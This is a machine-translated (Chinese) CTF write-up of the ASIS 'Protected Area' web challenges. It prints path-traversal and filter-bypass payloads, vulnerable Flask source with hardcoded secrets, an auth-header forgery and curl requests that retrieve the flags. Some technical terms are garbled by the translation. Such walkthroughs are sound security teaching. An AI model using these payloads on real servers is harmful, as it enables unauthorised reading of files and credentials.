<html>
<head>
<title>ASIS CTF — Protected Area 1 &amp; 2 Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CTF ASIS—保护区1和2演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/asis-ctf-protected-area-1-2-walkthrough-5e6db7869658?source=collection_archive---------1-----------------------#2019-11-17">https://infosecwriteups.com/asis-ctf-protected-area-1-2-walkthrough-5e6db7869658?source=collection_archive---------1-----------------------#2019-11-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="1db8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您好，本演练的读者应该知道这些主题:</p><ol class=""><li id="6079" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">码头工人</li><li id="f183" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">Nginx</li><li id="ea87" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">烧瓶结构及一点发展</li><li id="d963" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">将Flask作为uWSGI服务运行</li><li id="f4a3" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">Web应用程序漏洞评估</li><li id="c978" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">起毛</li></ol><figure class="la lb lc ld gt le gh gi paragraph-image"><div class="gh gi kz"><img src="../Images/611a7cd48861adabeabb03ab238aae56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1126/format:webp/1*zi0jG1tivsTN4ebcepg4ZA.png"/></div></figure><h1 id="1d82" class="lh li iq bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">保护区第一部分</h1><p id="dce8" class="pw-post-body-paragraph jn jo iq jp b jq mf js jt ju mg jw jx jy mh ka kb kc mi ke kf kg mj ki kj kk ij bi translated">打开<a class="ae mk" href="http://66.172.33.148:8008/" rel="noopener ugc nofollow" target="_blank">挑战IP </a>导致发送两个HTTP请求:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="9fd2" class="mq li iq mm b gy mr ms l mt mu"><a class="ae mk" href="http://66.172.33.148:8008/check_perm/readable/?file=public.txt" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:8008/check_perm/readable/?file=public.txt</a><br/><a class="ae mk" href="http://66.172.33.148:8008/read_file/?file=public.txt" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:8008/read_file/?file=public.txt</a></span></pre><p id="ea1b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一个链接进行了目录遍历:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="b417" class="mq li iq mm b gy mr ms l mt mu"><a class="ae mk" href="http://66.172.33.148:8008/check_perm/readable/?file=../../../../../../etc/passwd" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:8008/check_perm/readable/?file=../../../../../../etc/passwd</a></span></pre><p id="753f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，没有任何有用的收获。第二个链接是文件打开器。我试图模糊输入:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="cdf9" class="mq li iq mm b gy mr ms l mt mu">?file=[FUZZ]public.txt[FUZZ]</span></pre><p id="2cd6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">模糊结果:</p><ol class=""><li id="4e58" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated"><code class="fe mv mw mx mm b">../</code>被替换为空值(<code class="fe mv mw mx mm b">../public.txt</code>返回内容)</li><li id="84e3" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">文件应该以<code class="fe mv mw mx mm b">.txt</code>结尾</li></ol><p id="6b46" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试过了:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="6e3b" class="mq li iq mm b gy mr ms l mt mu">....//.txt</span></pre><p id="baaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">得到不同的错误(500)。为了绕过<code class="fe mv mw mx mm b">.txt</code>，我尝试了以下方法:</p><ol class=""><li id="47cb" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">空字节</li><li id="4867" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">新行/其他空白</li><li id="28a4" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">参数污染</li></ol><p id="6399" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一无所获。下面我花了一些时间，请求/回应如下:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="7a4e" class="mq li iq mm b gy mr ms l mt mu">?file=....//public.txt.txt -&gt; security<br/>?file=....//public.py.txt  -&gt; 500</span></pre><p id="c144" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为什么第一个链接返回安全？已经被<code class="fe mv mw mx mm b">.txt</code>结束了，应该没问题了。结论:<code class="fe mv mw mx mm b">.txt</code>应该是参数|查询字符串的最后一部分。所以:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="68a1" class="mq li iq mm b gy mr ms l mt mu">?file=....//&amp;.txt</span></pre><p id="08ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">得了500。过滤器被绕过。快速模糊:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="bfb6" class="mq li iq mm b gy mr ms l mt mu">?file=....//[FUZZ]&amp;.txt</span></pre><p id="93a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">透露了<code class="fe mv mw mx mm b">app.py</code>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="0bdf" class="mq li iq mm b gy mr ms l mt mu">from flask import Flask<br/><br/>def create_app():<br/>    """Construct the core application."""<br/>    app = Flask(__name__, instance_relative_config=False)<br/><br/>    with app.app_context():<br/>        # Imports<br/>        <strong class="mm ir">from . import api</strong></span><span id="81e9" class="mq li iq mm b gy my ms l mt mu">        return app</span></pre><p id="f00a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mv mw mx mm b">api.py</code>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="feb1" class="mq li iq mm b gy mr ms l mt mu">from flask import current_app as app<br/>from flask import request, render_template, send_file<br/><strong class="mm ir">from .functions import *<br/>from config import *</strong><br/>import os<br/><br/>@app.route('/check_perm/readable/', methods=['GET'])<br/>def app_check_file() -&gt; str:<br/>    try:<br/>        file = request.args.get("file")<br/><br/>        file_path = os.path.normpath('application/files/{}'.format(file))<br/>        with open(file_path, 'r') as f:<br/>            return str(f.readable())<br/>    except:<br/>        return '0'<br/><br/>@app.route('/read_file/', methods=['GET'])<br/>def app_read_file() -&gt; str:<br/>    <br/>    file = request.args.get("file").replace('../', '')<br/>    qs = request.query_string.decode('UTF-8')<br/><br/>    if qs.find('.txt') != (len(qs) - 4):<br/>        return 'security'<br/>    <br/>    try:<br/>        return send_file('files/{}'.format(file))<br/>    except Exception as e:<br/>        return "500"<br/><br/>@app.route('/protected_area_0098', methods=['GET'])<br/>@check_login<br/>def app_protected_area() -&gt; str:<br/>    return Config.FLAG<br/><br/>@app.route('/', methods=['GET'])<br/>def app_index() -&gt; str:<br/>    return render_template('index.html')<br/><br/>@app.errorhandler(404)<br/>def not_found_error(error) -&gt; str:<br/>    return "Error 404"</span></pre><p id="42f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">标志在<code class="fe mv mw mx mm b">protected_area_0098</code>中，但是需要认证，两个重要的文件是<code class="fe mv mw mx mm b">config.py</code> : (…//….//config.py &amp;。txt)</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="386f" class="mq li iq mm b gy mr ms l mt mu">import os<br/><br/>class Config:<br/>    """Set Flask configuration vars from .env file."""<br/><br/>    # general config<br/><strong class="mm ir">    FLAG       = os.environ.get('FLAG')<br/>    SECRET     = "s3cr3t"<br/>    ADMIN_PASS = "b5ec168843f71c6f6c30808c78b9f55d"</strong></span></pre><p id="a401" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有<code class="fe mv mw mx mm b">functions.py</code> (…。//functions.py &amp;。txt)</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="e2d7" class="mq li iq mm b gy mr ms l mt mu">from flask import request, abort<br/>from functools import wraps<br/>import traceback, os, hashlib<br/>from config import *<br/><br/>def check_login(f):<br/>    """<br/>    Wraps routing functions that require a user to be logged in<br/>    """<br/>    @wraps(f)<br/>    def wrapper(*args, **kwds):<br/>        try:<br/>            ah = request.headers.get('ah')<br/><br/>            <strong class="mm ir">if ah == hashlib.md5((Config.ADMIN_PASS + Config.SECRET).encode("utf-8")).hexdigest():<br/>                return f(*args, **kwds)</strong><br/>            else:<br/>                return abort(403)<br/><br/>        except:<br/>            return abort(403)<br/>        <br/>    return wrapper</span></pre><p id="1dc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">旗帜:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="0a43" class="mq li iq mm b gy mr ms l mt mu">curl <a class="ae mk" href="http://66.172.33.148:8008/protected_area_0098" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:8008/protected_area_0098</a> -H "ah: cbd54a3499ba0f4b221218af1958e281" -v<br/>*   Trying 66.172.33.148...<br/>* TCP_NODELAY set<br/>* Connected to 66.172.33.148 (66.172.33.148) port 8008 (#0)<br/>&gt; GET /protected_area_0098 HTTP/1.1<br/>&gt; Host: 66.172.33.148:8008<br/>&gt; User-Agent: curl/7.64.1<br/>&gt; Accept: */*<br/>&gt; ah: cbd54a3499ba0f4b221218af1958e281<br/>&gt;<br/>&lt; HTTP/1.1 200 OK<br/>&lt; Server: nginx/1.15.8<br/>&lt; Date: Sun, 17 Nov 2019 13:53:05 GMT<br/>&lt; Content-Type: text/html; charset=utf-8<br/>&lt; Content-Length: 38<br/>&lt;<br/>* Connection #0 to host 66.172.33.148 left intact<br/>ASIS{f70a0203d638a0c90a490ad46a94e394}<br/>* Closing connection 0</span></pre><h1 id="8abe" class="lh li iq bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">保护区第二部分</h1><p id="d187" class="pw-post-body-paragraph jn jo iq jp b jq mf js jt ju mg jw jx jy mh ka kb kc mi ke kf kg mj ki kj kk ij bi translated">挑战和之前一样。<code class="fe mv mw mx mm b">private.txt</code>揭示了后端基础架构:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="a5f8" class="mq li iq mm b gy mr ms l mt mu">https://github.com/tiangolo/uwsgi-nginx-flask-docker</span></pre><p id="ac9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我对URL的各个部分做了大量的模糊处理:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="85a0" class="mq li iq mm b gy mr ms l mt mu">?file=[FUZZ]public[FUZZ].txt[FUZZ]</span></pre><p id="187a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一无所获。花了一段时间后，我去查了第二个网址:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="f214" class="mq li iq mm b gy mr ms l mt mu"><a class="ae mk" href="http://66.172.33.148:5008/check_perm/readable/?file=test" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:5008/check_perm/readable/?file=test</a></span></pre><p id="4c5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与第一个问题不同的是，错误消息:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="ca78" class="mq li iq mm b gy mr ms l mt mu">[Errno 2] No such file or directory: '/files/test'</span></pre><p id="5017" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我试图模糊输入，没有什么有用的。几个小时后，我得到了一个错误的网址:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="483f" class="mq li iq mm b gy mr ms l mt mu"><a class="ae mk" href="http://66.172.33.148:5008/check_perm/test/?file=public.txt" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:5008/check_perm/test/?file=public.txt</a></span></pre><p id="ae1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="e8e1" class="mq li iq mm b gy mr ms l mt mu">'_io.TextIOWrapper' object has no attribute 'test'</span></pre><p id="3f78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在<code class="fe mv mw mx mm b">TextIOWrapper</code>中，所以我运行下面的代码:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="fe34" class="mq li iq mm b gy mr ms l mt mu">&gt;&gt;&gt; print(dir(open('/etc/passwd')))</span><span id="4081" class="mq li iq mm b gy my ms l mt mu">['_CHUNK_SIZE', '__class__', '__del__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '<strong class="mm ir">__hash__</strong>', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_checkClosed', '_checkReadable', '_checkSeekable', '_checkWritable', '_finalizing', 'buffer', 'close', 'closed', 'detach', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'line_buffering', 'mode', 'name', 'newlines', '<strong class="mm ir">read</strong>', 'readable', 'readline', 'readlines', 'reconfigure', 'seek', 'seekable', 'tell', 'truncate', 'writable', 'write', 'write_through', 'writelines']</span></pre><p id="284e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mv mw mx mm b">read</code>很好:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="5c1b" class="mq li iq mm b gy mr ms l mt mu"><a class="ae mk" href="http://66.172.33.148:5008/check_perm/read/?file=public.txt" rel="noopener ugc nofollow" target="_blank">http://66.172.33.148:5008/check_perm/read/?file=public.txt</a></span></pre><p id="bbbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我得到了内容，所以发现了文件泄露漏洞。我运行docker映像并进入其中:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="524c" class="mq li iq mm b gy mr ms l mt mu">docker run -d -p5000:80 uwsgi-nginx-flask-docker<br/>docker exec -it $(docker ps -q) /bin/bash</span></pre><p id="10db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下文件似乎更有趣:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="3fad" class="mq li iq mm b gy mr ms l mt mu">/etc/nginx/nginx.conf<br/>/etc/nginx/conf.d/nginx.conf</span></pre><p id="2c65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="f19f" class="mq li iq mm b gy mr ms l mt mu">server {<br/>    listen 80;<br/>    location / {<br/>        try_files $uri <a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>;<br/>    }<br/>    location <a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a> {<br/>        include uwsgi_params;<br/>        uwsgi_pass unix:///tmp/uwsgi.sock;<br/>    }<br/>    location /static {<br/>        <strong class="mm ir">alias /opt/py/app/static;</strong><br/>    }<br/>}</span></pre><p id="8360" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根文件夹:<code class="fe mv mw mx mm b">/opt/py/app</code>所以我通过查找应用程序名称(我通过猜测读取了<code class="fe mv mw mx mm b">config.py</code>，但是这还不够，因为标志不能被<code class="fe mv mw mx mm b">check_perm</code>端点读取):</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="23c5" class="mq li iq mm b gy mr ms l mt mu">import os</span><span id="2d92" class="mq li iq mm b gy my ms l mt mu">class Config:<br/>    """Set Flask configuration vars from .env file."""</span><span id="2a65" class="mq li iq mm b gy my ms l mt mu"># general config<br/>    FLAG      = "flag/flag"<br/>    FLAG_SEND = "../flag/flag"</span></pre><p id="8968" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">阅读<a class="ae mk" href="https://github.com/tiangolo/uwsgi-nginx-flask-docker" rel="noopener ugc nofollow" target="_blank">回购</a>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="c7c7" class="mq li iq mm b gy mr ms l mt mu">[uwsgi]<br/>module = main<br/>callable = app</span></pre><ul class=""><li id="b3d8" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk mz kr ks kt bi translated"><code class="fe mv mw mx mm b">module = main</code>是指文件<code class="fe mv mw mx mm b">main.py</code>。</li><li id="b689" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk mz kr ks kt bi translated"><code class="fe mv mw mx mm b">callable = app</code>是指<code class="fe mv mw mx mm b">Flask</code>中的【应用】，变量<code class="fe mv mw mx mm b">app</code></li></ul><p id="8fd3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="9a97" class="mq li iq mm b gy mr ms l mt mu">view-source:http://66.172.33.148:5008/check_perm/read/?file=../opt/py/app/uwsgi.ini</span></pre><p id="7d06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="fa14" class="mq li iq mm b gy mr ms l mt mu">[uwsgi]<br/><strong class="mm ir">module = main_application<br/></strong>callable = app<br/>py-autoreload = 1<br/>uid = nginx<br/>gid = nginx<br/>process = 5<br/>max-requests=5000</span></pre><p id="f0ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mv mw mx mm b">main_application.py</code>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="5c7e" class="mq li iq mm b gy mr ms l mt mu">from <strong class="mm ir">app_source.main</strong> import *</span><span id="a74a" class="mq li iq mm b gy my ms l mt mu">app = create_app()</span><span id="124e" class="mq li iq mm b gy my ms l mt mu">if __name__ == "__main__":<br/>    app.run(host='0.0.0.0', debug=True)</span></pre><p id="8b24" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">阅读所有文件揭示结构(从<code class="fe mv mw mx mm b">/opt/py/app/</code>):</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="cd34" class="mq li iq mm b gy mr ms l mt mu">.<br/>|-- <!-- -->main_application.py<br/>|-- app_source<br/>|-------------|--- main.py<br/>|-------------|--- admin_route.py<br/>|-------------|--- all_routes.py</span></pre><p id="59c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mv mw mx mm b">admin_routes.py</code>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="0e87" class="mq li iq mm b gy mr ms l mt mu">from flask import current_app as app<br/>from flask import request, render_template, send_file<br/>import traceback, json<br/>from config import *<br/>import os</span><span id="616c" class="mq li iq mm b gy my ms l mt mu"><a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>.route('/protected_area/&lt;file_hash&gt;', methods=['GET'])<br/>def app_protected_area(file_hash) -&gt; str:<br/>    try:<br/>        if str(hash(open(Config.FLAG))) == file_hash:<br/>            return send_file(Config.FLAG_SEND)<br/>        else:<br/>            abort(403)<br/>    except:<br/>        return "500"</span></pre><p id="2ae6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了读取标志，我应该有标志的散列，怎么做？我可以得到<code class="fe mv mw mx mm b">flag</code>的<code class="fe mv mw mx mm b">__hash__</code>属性。然而，<code class="fe mv mw mx mm b">check_perm</code>结束点不能包含<code class="fe mv mw mx mm b">flag</code>。解决方案在<code class="fe mv mw mx mm b">all_routes.py</code>中:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="c98a" class="mq li iq mm b gy mr ms l mt mu">from flask import current_app as app<br/>from flask import request, render_template, send_file<br/>import traceback, json<br/>import os</span><span id="c70d" class="mq li iq mm b gy my ms l mt mu"><a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>.route('/check_perm/&lt;method&gt;/', methods=['GET'])<br/>def app_checkb_file(method) -&gt; json:<br/>    try:<br/>        file = request.args.get("file")</span><span id="760a" class="mq li iq mm b gy my ms l mt mu">if file.find('/proc') != -1:<br/>            return "0"</span><span id="2476" class="mq li iq mm b gy my ms l mt mu">file_path = os.path.normpath('/files/{}'.format(file))<br/>        with open(file_path, 'r') as f:</span><span id="51df" class="mq li iq mm b gy my ms l mt mu">call = getattr(f, method)()<br/><strong class="mm ir">            if type(call) == int:<br/>                return str(call)</strong><br/><strong class="mm ir">            elif type(call) != list and file.find('flag') == -1:<br/>                return str(call)</strong></span><span id="55d5" class="mq li iq mm b gy my ms l mt mu">return '0'<br/>    except Exception as e:<br/>        return str(e)</span><span id="a5b8" class="mq li iq mm b gy my ms l mt mu"><a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>.route('/read_file/', methods=['GET'])<br/>def app_read_file() -&gt; str:<br/>    <br/>    file = request.args.get("file").replace('../', '')</span><span id="7728" class="mq li iq mm b gy my ms l mt mu">if file.find('.txt') != (len(file) - 4):<br/>        return 'security'<br/>    <br/>    try:<br/>        return send_file('/files/{}'.format(file))<br/>    except Exception as e:<br/>        return str(e)</span><span id="cd8f" class="mq li iq mm b gy my ms l mt mu"><a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>.route('/', methods=['GET'])<br/>def app_index() -&gt; str:<br/>    return render_template('index.html')</span><span id="6857" class="mq li iq mm b gy my ms l mt mu"><a class="ae mk" href="http://twitter.com/app" rel="noopener ugc nofollow" target="_blank">@app</a>.errorhandler(404)<br/>def not_found_error(error) -&gt; str:<br/>    return "Error 404"</span></pre><p id="d961" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">文件的哈希是一个整数:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="680a" class="mq li iq mm b gy mr ms l mt mu">&gt;&gt;&gt; type(open('/etc/passwd').__hash__())</span><span id="fb33" class="mq li iq mm b gy my ms l mt mu">&lt;class 'int'&gt;</span></pre><p id="d1a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这样我就可以计算出<code class="fe mv mw mx mm b">flag/flag</code>的<code class="fe mv mw mx mm b">__hash__()</code>:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="5df3" class="mq li iq mm b gy mr ms l mt mu">view-source:http://66.172.33.148:5008/check_perm/__hash__/?file=../opt/py/app/flag/flag</span></pre><p id="a3be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取标志:</p><pre class="la lb lc ld gt ml mm mn mo aw mp bi"><span id="c3d3" class="mq li iq mm b gy mr ms l mt mu">curl http://66.172.33.148:5008/protected_area/8771321880381</span><span id="9436" class="mq li iq mm b gy my ms l mt mu">ASIS{1b7dc3a5ba52a11f0361bec284e59d58}</span></pre></div><div class="ab cl na nb hu nc" role="separator"><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf"/></div><div class="ij ik il im in"><p id="230c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nh">关注</em> <a class="ae mk" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nh"> Infosec报道</em> </a> <em class="nh">获取更多此类精彩报道。</em></p><div class="ni nj gp gr nk nl"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd ir gy z fp nq fr fs nr fu fw ip bi translated">信息安全报道</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">medium.com</p></div></div><div class="nu l"><div class="nv l nw nx ny nu nz lf nl"/></div></div></a></div></div></div>    
</body>
</html>